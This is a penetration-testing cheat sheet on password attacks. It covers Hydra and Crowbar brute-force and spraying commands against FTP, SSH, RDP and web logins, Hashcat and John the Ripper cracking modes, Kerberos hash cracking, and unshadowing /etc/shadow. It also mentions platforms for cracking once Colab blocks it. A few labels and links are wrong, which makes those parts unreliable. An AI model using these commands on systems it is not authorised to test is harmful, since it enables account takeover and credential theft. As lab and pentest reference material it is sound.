# Cracking 
Cracking service logins and password hashes. 
## Contents
- [Cracking](#cracking)
  * [Contents](#contents)
  * [References](#references)
  * [Tools](#tools)
  * [Wordlists](#wordlists)
- [Cracking Services](#cracking-services)
  * [Default Credentials](#default-credentials)
  * [Hydra](#hydra)
  * [Burp Suite](#burp-suite)
  * [RDP with Crowbar](#rdp-with-crowbar)
  * [Misc Service Crackers](#misc-service-crackers)
- [Cracking Offline Passwords](#cracking-offline-passwords)
  * [Hashcat](#hashcat)
    + [Benchmark Test (Hash Type)](#benchmark-test--hash-type-)
    + [Show Example Hash](#show-example-hash)
    + [Dictionary Attack](#dictionary-attack)
    + [Mask Attack](#mask-attack)
    + [Increment](#increment)
    + [Cracking Linux Passwords](#cracking-linux-passwords)
    + [Cracking krb5ts Keys](#cracking-krb5ts-keys)
    + [Cracking Asrep keys](#cracking-asrep-keys)
  * [John the Ripper](#john-the-ripper)
    + [Windows:](#windows-)
    + [Linux](#linux)
    + [SQLMap Output](#sqlmap-output)

## References 
[Cracking the Hashes](https://zweilosec.gitbook.io/hackers-rest/os-agnostic/password-cracking/cracking-the-hashes)   
[Name That Hash](https://nth.skerritt.blog/) to identify a hash type.     
[John the Ripper Cheatsheet](https://4n3i5v74.github.io/posts/cheatsheet-john-the-ripper/)    
[SkullSecurity Wiki Page](https://wiki.skullsecurity.org/index.php/Passwords)    

## Tools
Passwords, login pages, etc.
[Ciphey](https://github.com/Ciphey/Ciphey)  
[CyberChef](https://gchq.github.io/CyberChef/)  

## Wordlists    
[Seclists](https://github.com/danielmiessler/SecLists)       
[Have I Been Pwned Passwords](https://haveibeenpwned.com/Passwords)   
[Rainbow Crack, Rainbow Tables](http://project-rainbowcrack.com/table.htm)   
[Rocktastic Mega Wordlist](https://labs.nettitude.com/tools/rocktastic/)  
[berzerk0 wordlist](https://www.hack3r.com/forum-topic/wikipedia-wordlist)   
[Weakpass](https://www.hack3r.com/forum-topic/wikipedia-wordlist)   
Make your own wordlist: [Crunch](https://sourceforge.net/projects/crunch-wordlist/)  [Cewl](https://github.com/digininja/cewl)  
[Kaonashi Wordlist](https://github.com/kaonashi-passwords/Kaonashi/tree/master)    
[Mega wordlist](https://github.com/Karmaz95/crimson_cracking)     

# Cracking Services   
## Default Credentials
    Check Web Enumeration checklist for default CMS creds
    https://cirt.net/passwords
    https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials

## Hydra
[Brute Force Login Pages with Hydra](https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/)   
[Brute Forcing Services with Hydra](https://securitytutorials.co.uk/brute-forcing-passwords-with-thc-hydra/)  
ftp, ssh, rdp, http-post, http-get 

    hydra -l ftp -P passlist.txt ftp://10.10.x.x  
    hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v    
    hydra -e nsr -l username -P wordlist 10.10.10.10 service -s [port if not default]     
    -e nsr: tries no pass, same pass as usernames, passwords as backwords username  
    hydra -C creds_list 10.10.10.10 vnc     #use creds list in format user:password   
Password Spray a List of IPs (1 on each line IP:port if needed)    

    hydra -M servers.list -C creds.txt ssh    
http-get 

    hydra -L user.txt -P wordlist.txt 10.10.10.10 http-get /directory_path  
    hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f   
    
http-post

    intercept request in burp - see body. No response - :S=302    
    hydra 10.10.10.10 http-form-post "/index.php:user=admin&pass=^PASS^:INVALID LOGIN MSG" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f  
    
## Burp Suite 
[Brute forcing web login pages with intruder](https://portswigger.net/support/using-burp-to-brute-force-a-login-page)  
Look for change in status code or change in length of header
    
## RDP with Crowbar 

    crowbar -b rdp -s 10.10.10.10 -u admin -C rockyou.txt -n 1
    
## Misc Service Crackers  
wpscan: crack wordpress logins     
[pwn Jenkins](https://github.com/gquere/pwn_jenkins): crack Jenkins service  


# Cracking Offline Passwords  
## Online Hash Lookup    
[Identify Hash Type](https://www.tunnelsup.com/hash-analyzer/)       
[Name That Hash](https://nth.skerritt.blog/)   
[Search that Hash](https://github.com/HashPals/Search-That-Hash): search online sites then try with hashcat    
 
    hash-identifier [hash]    

Online Hash Databases   
[Crackstation](https://crackstation.net/): try first esp. with Windows hashes       
[MD5Decrypt](https://md5decrypt.net/): look up MD5 hashes    
[Hash Toolkit](https://hashtoolkit.com/): MD5, SHA1, SHA256, SHA512 hashes    
[Cmd5](https://www.cmd5.org/): MD5, SHA1, MySQl and SHA256 hashes    
[Online Hash Crack](https://www.onlinehashcrack.com/): Hashes, WPA2 captures, PDF, zips     

Note: Google Collab now does not allow instances to be used for password cracking, and will detect and block the use of password cracking software (blocks hashcat install).                
Large wordlist - use google colab projects: [colabsth](https://github.com/vaishnavpardhi/colabsth/), or [penglab - Hashcat, John, Hydra](https://github.com/mxrch/penglab)   
Google Collab alternatives: 
[vast.ai](https://vast.ai/), [setup](https://www.scrawledsecurityblog.com/2020/11/cracking-password-hashes-on-cheap-how.html)              
 
 
## Hashcat 

    hashcat -m [mode] hashes wordlist   
    
Quick Reference:   

    potfile: hashcat.potfile, usually in ~/.hashcat/ on Kali.    
    hashcat -m 1000 hashes.ntds --show --user   #see cracked hashes and usernames    
    -a 0    #attack mode 0 for a wordlist attack should be good to crack most passwords      
    -m 1000   #NT (most Windows passwords)   
    -m 3000   #LANMAN (legacy Windows password hashes, very weak)    
    -m 5500   #NTLMv1 (hashes captured from using a tool like Responder)     
    -m 5600   #NTLMv2 (hashes captured from using a tool like Responder)     
    
    -m 1600   #MD5     
    -m 500    #MD5 /etc/shadow and /etc/passwd combined       
    -a 0 -r hashcat/rules/best64.rule # use standard rule file with a wordlist attack          
    
### Benchmark Test (Hash Type)

    hashcat -b -m #type
### Show Example Hash 

    hashcat -m #type --example-hashes
### Dictionary Attack

    hashcat -a 0 -m #type hash.txt dict.txt

### Dictionary and Rules Attack      
dive.rule, best64.rule   
[One rule to rule them all](https://github.com/NotSoSecure/password_cracking_rules)  


    hashcat -a 0 -m #type hash.txt wordlist.txt -r rule.txt  
    hashcat -m 1000 -a 0 hash.txt wordlist.txt -r best64.rule    #standard rule file used 
    
    
### Combination Attack   

    hashcat -a 1 -m #type hash.txt wordlist1.txt wordlist2.txt 
   
   
### Mask Attack

Windows minimum standard password complexity policy is often:    

    At least 8 characters in length   
    At least one uppercase letter   
    At least one lowercase letter    
    At least one digit    
    
Markers to specifiy type of character:    

    ?l = abcdefghijklmnopqrstuvwxyz    
    ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ    
    ?d = 0123456789    
    ?s = !"#$%&'()*+,-./:;<=>?@[]^_`{|}~   
    ?a = ?l?u?d?s    
    ?b = 0x00 - 0xff   


    hashcat -a 3 -m #type hash.txt ?a?a?a?a?a?a   
    hashcat -m 1000 -a 3 hashes.ntds ?u?l?l?l?l?l?l?d      #minimum Windows password policy    

### Hybrid Dictionary and Mask   

    hashcat -a 6 -m #type hash.txt wordlist.txt ?a?a?a?a

### Hybrid Mask and Dictionary    

    hashcat -a 7 -m #type hash.txt ?a?a?a?a wordlist.txt  
   

### Increment

Default Increment

    hashcat -a 3 -m #type hash.txt ?a?a?a?a?a --increment

Increment Minimum Length

    hashcat -a 3 -m #type hash.txt ?a?a?a?a?a --increment-min=4

Increment Max Lenth

    hashcat -a 3 -m #type hash.txt ?a?a?a?a?a?a --increment-max=5

Session Restore 

    hashcat -a 0 -m #type --restore --session <uniq_name> hash.txt wordlist.txt

### Cracking Linux Passwords  
username:x or ! or password (older Unix):GECOS (for compatibility):hashtype: salt:hash   #format in /etc/shadow   
Hashtypes:    

    $ : DES       $1  : MD5      $2 : Blowfish   $5 : SHA-256    $6 : SHA-512   

### Cracking krb5ts Keys

    hashcat -m 13100 --force <TGSs_file> <passwords_file>

### Cracking Asrep keys

    hashcat -a 0 -m 18200 <asrep_file> <password_file> 

## John the Ripper    
[John the Ripper Cheatsheet](https://countuponsecurity.files.wordpress.com/2016/09/jtr-cheat-sheet.pdf)      
John is easier to user then hashcat - but slower and not as flexible. It will crack hashes of the first algorithim / hashtype seen in a file. Stores cracked passwords in ~/.john/john.pot by default.      
Install newest version:     

    git clone https://github.com/openwall/john -b bleeding-jumbo /data/tools/john ; cd /data/tools/john/src/ ; ./configure && make -s clean && make -sj4 ; cd ~   
Use rules:     

    john combined --format=md5crypt --wordlist=wordlist.txt --rules=Jumbo     
    --rules=KoreLogic    
    --rules=All      
### Windows:  
Supply the text output from Impacket secretsdump.py, Mimikatz, Meterpreter as the file to crack hashes from.    

    john --format=nt hash.txt     #specify NT (default is LANMAN)    
    --format=netntlm    #with Responder
    --format=netntlmv2   #with Responder   

### Linux    
Copy /etc/passwd and /etc/shadow to local workstation, unshadow passwd shadow, crack hashes.   

    sudo unshadow /etc/passwd /etc/shadow > combined            
    john combined   
SHA512 hashes    

    john --wordlist=rockyou.txt --format=sha512crypt hashes        
MD5 Hashes    

    john --format=NT --wordlist=rockyou.txt hashes          
    
### SQLMap Output      

    john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/sqlmap*/sqlmap* --rules     

